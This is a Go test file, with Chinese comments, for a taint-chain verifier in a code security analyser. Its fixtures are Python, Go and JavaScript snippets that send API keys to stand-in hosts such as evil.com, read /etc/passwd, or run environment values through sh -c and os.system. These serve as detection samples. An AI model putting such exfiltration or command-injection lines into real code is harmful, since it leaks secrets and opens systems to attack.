package ir

import (
	"fmt"
	"testing"
)

func TestChainVerificationCredentialNetwork(t *testing.T) {
	// 测试凭据→网络外发链
	code := `import os
import requests

def exfiltrate():
    secret = os.getenv("API_KEY")
    requests.post("https://evil.com", json={"key": secret})
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("cred_net.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	results := VerifyChains([]File{*file})

	fmt.Println("=== 凭据→网络外发链 ===")
	for _, r := range results {
		if r.Verified {
			fmt.Println(r.String())
			for _, e := range r.Evidence {
				fmt.Printf("  证据[%s]: %s (强度=%s)\n", e.Kind, e.Description, e.Strength)
			}
			if len(r.DataFlowPath) > 0 {
				fmt.Println("  数据流路径:")
				for _, step := range r.DataFlowPath {
					fmt.Printf("    %s: %s → %s\n", step.Kind, step.VarName, step.Description)
				}
			}
		}
	}

	// 检查 credential-network 链是否被验证
	found := false
	for _, r := range results {
		if r.PatternID == "credential-network" && r.Verified {
			found = true
			if r.Confidence != "高" {
				t.Errorf("expected high confidence for taint-verified chain, got %s", r.Confidence)
			}
		}
	}
	if !found {
		t.Error("credential-network chain should be verified via taint analysis")
	}
}

func TestChainVerificationFileReadWrite(t *testing.T) {
	// 测试文件读取→写入链
	code := `import os

def copy_file():
    data = os.ReadFile("/etc/passwd")
    os.WriteFile("/tmp/leak.txt", data, 0o644)
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("file_rw.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	results := VerifyChains([]File{*file})

	fmt.Println("=== 文件读写链 ===")
	for _, r := range results {
		if r.Verified {
			fmt.Println(r.String())
			for _, e := range r.Evidence {
				fmt.Printf("  证据[%s]: %s\n", e.Kind, e.Description)
			}
		}
	}
}

func TestChainVerificationNoFalsePositive(t *testing.T) {
	// 安全代码不应触发链验证
	code := `import os

def safe():
    name = "hello"
    print(name)
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("safe_chain.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	results := VerifyChains([]File{*file})
	verified := VerifiedChains(results)

	fmt.Printf("安全代码: %d 条链验证通过 (期望 0)\n", len(verified))
	if len(verified) > 0 {
		for _, v := range verified {
			t.Errorf("false positive: %s", v.String())
		}
	}
}

func TestChainVerificationCallChain(t *testing.T) {
	// 测试通过调用链验证的场景
	code := `import os
import requests

def main():
    data = read_secret()
    send_out(data)

def read_secret():
    return os.getenv("API_KEY")

def send_out(data):
    requests.post("https://exfil.com", data=data)
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("callchain.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	results := VerifyChains([]File{*file})

	fmt.Println("=== 调用链验证 ===")
	verified := VerifiedChains(results)
	for _, r := range verified {
		fmt.Println(r.String())
		if len(r.CallChainPath) > 0 {
			fmt.Printf("  调用链: %v\n", r.CallChainPath)
		}
		for _, e := range r.Evidence {
			fmt.Printf("  证据[%s]: %s\n", e.Kind, e.Description)
		}
	}
}

func TestChainVerificationGo(t *testing.T) {
	// 测试 Go 语言的链验证
	code := `package main

import (
	"net/http"
	"os"
	"os/exec"
)

func handler(w http.ResponseWriter, r *http.Request) {
	cmd := os.Getenv("CMD")
	exec.Command("sh", "-c", cmd).Run()
}
`

	parser, _ := GetParser("go")
	file, err := parser.Parse("handler.go", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	results := VerifyChains([]File{*file})

	fmt.Println("=== Go 凭据→命令执行链 ===")
	for _, r := range results {
		if r.Verified {
			fmt.Println(r.String())
			for _, e := range r.Evidence {
				fmt.Printf("  证据[%s]: %s\n", e.Kind, e.Description)
			}
		}
	}
}

func TestChainVerificationJavaScript(t *testing.T) {
	// 测试 JavaScript 的链验证
	code := `const axios = require('axios');

function attack() {
    const secret = process.env.API_KEY;
    axios.post('https://evil.com', { key: secret });
}
`

	parser, _ := GetParser("javascript")
	file, err := parser.Parse("attack.js", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	results := VerifyChains([]File{*file})

	fmt.Println("=== JavaScript 凭据→网络链 ===")
	verified := VerifiedChains(results)
	for _, r := range verified {
		fmt.Println(r.String())
	}
}

func TestChainPatternMatching(t *testing.T) {
	// 测试自定义链模式
	customPatterns := []ChainPattern{
		{
			ID:             "custom-leak",
			Description:    "自定义数据泄露链",
			SourceCategory: CatEnvAccess,
			SinkCategory:   CatCommandExec,
			Severity:       "高风险",
		},
	}

	code := `import os

def run():
    key = os.getenv("SECRET")
    os.system("echo " + key)
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("custom_chain.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	// 构建依赖
	builder := NewCallGraphBuilder()
	graph := builder.Build([]File{*file})
	taintAnalyzer := NewTaintAnalyzer(DefaultTaintRules())
	taintFindings := taintAnalyzer.Analyze([]File{*file})

	// 使用自定义模式
	verifier := NewChainVerifier(customPatterns, graph, taintFindings, []File{*file})
	results := verifier.Verify()

	fmt.Println("=== 自定义链模式 ===")
	for _, r := range results {
		fmt.Println(r.String())
		for _, e := range r.Evidence {
			fmt.Printf("  证据[%s]: %s\n", e.Kind, e.Description)
		}
	}

	if len(results) == 0 {
		t.Error("should have at least one result")
	}
}

func TestChainVerificationMultipleSinks(t *testing.T) {
	// 测试一条 source 对多个 sink 的场景
	code := `import os
import requests

def multi_sink():
    secret = os.getenv("SECRET")
    requests.post("https://evil.com", data=secret)
    os.system("echo " + secret)
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("multi_sink.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	results := VerifyChains([]File{*file})
	verified := VerifiedChains(results)

	fmt.Printf("多 sink 场景: %d 条链验证通过\n", len(verified))
	for _, r := range verified {
		fmt.Println(r.String())
	}

	// 至少应该有 credential-network 和 user-input-cmd-exec
	if len(verified) < 1 {
		t.Error("should verify at least one chain for multi-sink scenario")
	}
}

func TestHighConfidenceChains(t *testing.T) {
	code := `import os
import requests

def leak():
    key = os.getenv("API_KEY")
    requests.post("https://evil.com", json={"key": key})
`

	parser, _ := GetParser("python")
	file, err := parser.Parse("high_conf.py", code)
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	results := VerifyChains([]File{*file})
	high := HighConfidenceChains(results)

	fmt.Printf("高置信度链: %d\n", len(high))
	for _, r := range high {
		fmt.Println(r.String())
	}

	if len(high) == 0 {
		t.Error("should have at least one high-confidence chain")
	}
}
